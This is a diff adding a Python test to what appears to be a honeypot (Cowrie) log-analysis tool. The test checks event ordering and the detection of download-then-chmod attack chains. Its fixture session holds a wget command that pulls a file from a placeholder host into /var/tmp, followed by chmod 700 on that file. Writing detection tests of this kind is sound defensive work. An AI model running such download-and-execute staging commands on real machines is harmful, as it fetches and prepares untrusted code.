@@ -2,9 +2,14 @@
 
 from __future__ import annotations
 
-from production.reporting.typed_semantic_chain_selection import select_typed_semantic_chains
+from production.reporting.typed_semantic_chain_selection import (
+    chronology_quality_for_fact_set,
+    select_typed_semantic_chains,
+)
 from tests.test_cross_family_relationship_evaluation import _build
-from tests.test_transfer_family_migration import _payload, _report, _transfer_event
+from tests.test_transfer_family_migration import (
+    _payload, _report, _transfer_event, _typed_inputs,
+)
 
 
 RULE = {
@@ -94,4 +99,46 @@ def test_direct_transfer_and_observed_chmod_keep_distinct_authorities() -> None:
     assert len(report["hypothesis_sets"]) == 1
     assert "completion and effects are not established" in (
         report["hypothesis_sets"][0]["hypotheses"][0]["statement"]
+    )
+
+
+def test_interleaved_direct_transfer_uses_raw_event_order_not_command_counter() -> None:
+    session = "interleaved-transfer-then-chmod"
+    payload = _payload(
+        session,
+        commands=[
+            ("pwd", "unknown", ""),
+            ("ls", "unknown", ""),
+            ("wget https://example.invalid/a -O /var/tmp/observed.bin", "unknown", ""),
+            ("chmod 700 /var/tmp/observed.bin", "unknown", ""),
+        ],
+        transfer_events=[_transfer_event(session, index=3)],
+    )
+    command_events = payload["raw_events"][:4]
+    command_events[3]["timestamp"] = "2026-07-30T03:00:04Z"
+    preceding_events = [
+        {
+            "session": session,
+            "src_ip": payload["src_ip"],
+            "timestamp": f"2026-07-30T02:59:5{index}Z",
+            "eventid": "cowrie.client.version",
+        }
+        for index in range(3)
+    ]
+    payload["raw_events"] = [
+        *preceding_events,
+        *command_events[:3],
+        payload["raw_events"][4],
+        command_events[3],
+    ]
+    _observed, facts, _selection = _typed_inputs(payload)
+    assert chronology_quality_for_fact_set(facts)["quality"] == "timestamp_supported"
+    matches = select_typed_semantic_chains(facts, [RULE])["matches"]
+    assert len(matches) == 1
+    assert matches[0]["status"] == "incomplete"
+    report = _report(payload)
+    assert len(report["hypothesis_sets"]) == 1
+    assert not any(
+        finding.get("finding_type") == "connected_transfer_permission_execution"
+        for finding in report["behavioral_findings"]
     )
